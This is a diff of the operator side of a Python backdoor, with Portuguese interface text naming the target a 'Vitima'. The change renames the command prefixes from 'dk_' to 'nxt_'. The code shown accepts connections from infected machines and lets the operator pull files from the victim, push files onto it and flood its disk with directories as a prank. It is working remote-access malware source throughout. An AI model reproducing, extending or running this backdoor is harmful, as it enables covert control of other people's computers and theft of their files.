@@ -33,14 +33,14 @@ while True:
     try:
         client, andress = socket.accept()
         AdaptedFromSystem(Windows='cls', Linux='clear')
-        print(f"\33[7;32m[CONNECTION] Uma conexão foi estabelecida | ANDRESS: {andress[0]}:{andress[1]}\33[m\nUse 'dk_help' para ver os comandos.")
+        print(f"\33[7;32m[CONNECTION] Uma conexão foi estabelecida | ANDRESS: {andress[0]}:{andress[1]}\33[m\nUse 'nxt_help' para ver os comandos.")
         try:
             while client:
                 AdaptedFromSystem(Windows=f'title Painel Backdoor - Vitima ANDRESS: {andress[0]}:{andress[1]}')
                 command = input(f'\33[1;34m@command\33[m: ').lower().strip()
                 
                 ## Fecha conexão com o client atual.
-                if(command == 'dk_exit'):
+                if(command == 'nxt_exit'):
                     client.close()
                     print('\33[7;93m[INFO] A conexão foi fechada com sucesso. Aguardadndo uma nova conexão...\33[m')
                     break
@@ -51,11 +51,11 @@ while True:
 
 
                 ## Transfere um arquivo da vitima para o servidor.
-                elif(command == 'dk_getfile'):
+                elif(command == 'nxt_getfile'):
                     file = input('\33[1;93m[DIR] Digite o diretorio do arquivo para fazer o download.\n>\33[m ').strip()
                     print('\n\33[7;93m[PROGRESS] Fazendo download do arquivo...\33[m')
                     try:
-                        data = {'command':'dk_getfile', 'file':file}
+                        data = {'command':'nxt_getfile', 'file':file}
                         client.send(bytes(str(data), 'UTF-8'))
                         size = client.recv(1024)
                         download = client.recv(int(size.decode()))
@@ -69,7 +69,7 @@ while True:
                
                
                 ## Transfere um arquivo da maquina para a vitima.
-                elif(command == 'dk_sendfile'):
+                elif(command == 'nxt_sendfile'):
                     try:
                         file_name = input('\33[1;93m[FILE] Digite o diretorio do arquivo para fazer o upload.\n>\33[m ').strip()
                         if(exists(file_name) == False):
@@ -80,7 +80,7 @@ while True:
                             dir = input(
                             '\33[1;93m[FILE] Digite o diretorio em que o arquivo sera baixado(aperte enter para o mesmo diretorio do programa)\n>\33[m '
                             ).strip()
-                            data = {'command':'dk_sendfile', 'file':dir, 'size':(getsize(file_name)+1024)}
+                            data = {'command':'nxt_sendfile', 'file':dir, 'size':(getsize(file_name)+1024)}
                             client.send(bytes(str(data), 'UTF-8'))
                             with open(file_name, 'rb') as f:
                                 client.send(f.read())
@@ -95,7 +95,7 @@ while True:
                         print(f'\n\33[7;31m[ERROR] {errorcode}\33[m')
 
                 ## Cria varios diretorios(troll)
-                elif(command == 'dk_spamdir'):
+                elif(command == 'nxt_spamdir'):
                     dir = input('\33[1;93m[DIR] Digite o diretorio a ser criado as pastas(Escolha corretamente, caso aperte enter ele irá criar na pasta base, exemplo C:\).\n>\33[m ').strip()
                     name_path = input('\33[1;93m[NAME] Digite o nome que as pastas irão receber\n>\33[m ').strip()
                     while True:
@@ -105,7 +105,7 @@ while True:
                                 print('\n\33[7;31m[ERROR] Digite um valor maior que 0.\33[m')
                                 continue
                             else:
-                                data = {'command':'dk_spamdir', 'dir':dir, 'name_path':name_path, 'amount':amount}
+                                data = {'command':'nxt_spamdir', 'dir':dir, 'name_path':name_path, 'amount':amount}
                                 client.send(bytes(str(data), 'UTF-8'))
                                 print('\n\33[7;93m[PROGRESS] Tentando fazer o spam de diretorios...\33[m')
                                 break
@@ -120,11 +120,11 @@ while True:
 
 
                 ## Printa na tela os comandos do backdoor.
-                elif(command == 'dk_help'): 
+                elif(command == 'nxt_help'): 
                     ShowDialogHelp()
 
                 ## Checa a versão do backdoor.
-                elif(command == 'dk_checkv'):
+                elif(command == 'nxt_checkv'):
                     print(f'\n\33[1;31mVersao\33[m: {INFO_BACKDOOR["version"]}\n\33[1;31mUltimo Update\33[m: {INFO_BACKDOOR["update_data"]}\n')
 
 
